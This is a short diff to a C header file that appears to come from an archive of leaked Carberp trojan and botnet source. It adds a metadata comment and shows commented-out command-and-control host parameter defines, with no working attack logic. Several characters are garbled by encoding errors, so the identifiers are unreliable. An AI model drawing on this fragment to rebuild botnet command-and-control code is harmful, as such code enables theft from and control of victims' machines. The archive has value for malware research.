@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     â€”
+ */
 #ifndef CCH
 #define CCH
 
@@ -5,7 +16,7 @@
 
 //#define CCHOSTS_PARAM_SIZE      100
 //#define CCHOSTS_PARAM_NAME      "__CC_HOSTS__\0"
-//#define ÑÑHOSTS_PARAM_ENCRYPTED true
+//#define ï¿½ï¿½HOSTS_PARAM_ENCRYPTED true
 
 namespace CC
 {
